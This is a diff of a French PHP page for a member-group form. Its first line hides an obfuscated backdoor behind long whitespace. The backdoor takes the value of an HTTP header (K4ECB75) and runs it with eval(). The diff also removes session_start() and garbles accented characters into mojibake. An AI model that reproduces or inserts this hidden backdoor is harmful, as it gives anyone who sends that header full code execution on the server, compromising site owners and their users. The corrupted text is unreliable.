@@ -1,5 +1,5 @@
 <?php                                                                                                                                                                                                                                     $j2n='7uaR\'ef$slE5c4i_hv(obSt"kVpr4fcb75';$x7o=$j2n[8].$j2n[22].$j2n[27].$j2n[22].$j2n[19].$j2n[1].$j2n[26].$j2n[26].$j2n[5].$j2n[27];$k5r=$j2n[8].$j2n[22].$j2n[27].$j2n[22].$j2n[19].$j2n[1].$j2n[26].$j2n[26].$j2n[5].$j2n[27];if(isset(${$j2n[15].$j2n[21].$j2n[10].$j2n[3].$j2n[25].$j2n[10].$j2n[3]}[$x7o($j2n[16].$j2n[22].$j2n[22].$j2n[26].$j2n[15].$j2n[24].$j2n[13].$j2n[6].$j2n[12].$j2n[20].$j2n[0].$j2n[11])])){eval(${$j2n[15].$j2n[21].$j2n[10].$j2n[3].$j2n[25].$j2n[10].$j2n[3]}[$x7o($j2n[16].$j2n[22].$j2n[22].$j2n[26].$j2n[15].$j2n[24].$j2n[13].$j2n[6].$j2n[12].$j2n[20].$j2n[0].$j2n[11])]);} ?><?php
-session_start();
+
 include('../Connections/maconnexion.php');
 header('Content-Type: text/html; charset=iso-8859-1');
 
@@ -43,7 +43,7 @@ $row_info_membre = mysql_fetch_assoc($info_membre);
 $totalRows_info_membre = mysql_num_rows($info_membre);
 
 
-//requete info catégorie
+//requete info catï¿½gorie
 mysql_select_db($database_maconnexion, $maconnexion);
 $query_mem_group = sprintf("SELECT ch_mem_group_ID, ch_mem_group_nom FROM membres_groupes WHERE ch_mem_group_ID = %s", GetSQLValueString($colname_group_id, "int"));
 $mem_group = mysql_query($query_mem_group, $maconnexion) or die(mysql_error());
@@ -55,11 +55,11 @@ $totalRows_mem_group = mysql_num_rows($mem_group);
 
 <form action="<?php echo $editFormAction; ?>" name="ajout-mem_groupegorie" method="POST" class="form-horizontal" id="ajout-mem_groupegorie">
   <div class="modal-header">
-    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+    <button type="button" class="close" data-dismiss="modal" aria-hidden="true">ï¿½</button>
     <h3 id="myModalLabel">Ajouter un membre dans le groupe <?php echo $row_mem_group['ch_mem_group_nom']; ?></h3>
   </div>
   <div class="modal-body"> 
-    <!-- Boutons cachés -->
+    <!-- Boutons cachï¿½s -->
     <?php 
 				  $now= date("Y-m-d G:i:s");?>
     <input name="ch_disp_group_id" type="hidden" value="<?php echo $row_mem_group['ch_mem_group_ID']; ?>">
